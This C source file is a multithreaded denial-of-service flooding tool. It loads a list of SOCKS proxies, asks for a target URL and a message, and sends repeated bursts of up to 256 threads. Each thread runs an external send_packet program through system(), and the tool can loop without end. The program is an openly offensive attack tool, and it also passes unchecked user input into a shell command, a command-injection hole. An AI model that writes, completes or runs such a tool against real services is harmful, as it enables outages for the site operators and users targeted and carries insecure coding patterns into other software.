#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>
#define MAX_LINE_LENGTH 256

volatile sig_atomic_t stop = 0;

void handle_sigint(int sig) {
    stop = 1;
}

typedef struct {
    char ip_port[256];
    char url[256];
    char message[256];
    int send_count;
} SendData;
void extract_and_save(const char *inputFile, const char *outputFile) {
    FILE *input = fopen(inputFile, "r");
    FILE *output = fopen(outputFile, "w");

    if (input == NULL || output == NULL) {
        return;
    }

    char line[MAX_LINE_LENGTH];
    while (fgets(line, sizeof(line), input)) {
        char ip[100], port[10];
        int result = sscanf(line, "%99[^:]:%9s", ip, port);
        if (result == 2) {
            int isValidPort = 1;
            for (int i = 0; port[i] != '\0'; i++) {
                if (port[i] < '0' || port[i] > '9') {
                    isValidPort = 0;
                    break;
                }
            }
            if (isValidPort) {
                fprintf(output, "%s:%s\n", ip, port);
            }
        }
    }
    fclose(input);
    fclose(output);
}
void *send_data(void *arg) {
    SendData *data = (SendData *)arg;
    char command[512];
    snprintf(command, sizeof(command), "./send_packet -ip %s -p %s -m \"%s\"", data->ip_port, data->url, data->message);
    int status = system(command);
    if (status == 0) {
        printf(" >Sent to: %s|%s|%s|%d - >> Success\n", data->ip_port, data->url, data->message, data->send_count);
    }

    free(data); 
    return NULL;
}

int main() {
    const char *inputFile = "conf/list_socks.txt"; 
    const char *outputFile = "conf/list_socks_ddos.txt";  

    extract_and_save(inputFile, outputFile);
    char url[256];
    char message[256];
    FILE *file;
    char line[256];
    int send_count = 1;
    int max_sends = -1;
    char mode_choice[10];
    pthread_t thread_id[256];
    int thread_count = 0;
    signal(SIGINT, handle_sigint);

    printf("Enter the URL (e.g., https://example.com): ");
    fgets(url, sizeof(url), stdin);
    url[strcspn(url, "\n")] = '\0'; 

    printf("Enter the message: ");
    fgets(message, sizeof(message), stdin);
    message[strcspn(message, "\n")] = '\0'; 
    printf("Do you want to run in auto mode (infinite loop) or a specified number of sends? (auto/number): ");
    fgets(mode_choice, sizeof(mode_choice), stdin);
    mode_choice[strcspn(mode_choice, "\n")] = '\0';  

    if (strcmp(mode_choice, "auto") != 0) {
        max_sends = atoi(mode_choice);
        if (max_sends <= 0) {
            printf("Invalid number, defaulting to infinite loop.\n");
            max_sends = -1; 
        }
    }
    file = fopen("conf/list_socks_ddos.txt", "r");
    if (file == NULL) {
        perror("Error opening file");
        return 1;
    }

    printf("\n--- Send Report ---\n");
    while (!stop && (max_sends == -1 || send_count <= max_sends)) {
        fseek(file, 0, SEEK_SET);
        while (fgets(line, sizeof(line), file)) {
            line[strcspn(line, "\n")] = '\0';
            SendData *data = (SendData *)malloc(sizeof(SendData));
            if (data == NULL) {
                perror("Error allocating memory");
                continue;
            }
            strncpy(data->ip_port, line, sizeof(data->ip_port));
            strncpy(data->url, url, sizeof(data->url));
            strncpy(data->message, message, sizeof(data->message));
            data->send_count = send_count;
            if (pthread_create(&thread_id[thread_count], NULL, send_data, (void *)data) != 0) {
                perror("Error creating thread");
                free(data);
                continue;
            }

            send_count++; 
            thread_count++; 
            if (thread_count >= 256) {
                for (int i = 0; i < thread_count; i++) {
                    pthread_join(thread_id[i], NULL);  
                }
                thread_count = 0;  
            }
        }
    }
    for (int i = 0; i < thread_count; i++) {
        pthread_join(thread_id[i], NULL);
    }
    fclose(file);
    printf("\nProgram exited gracefully.\n");

    return 0;
}
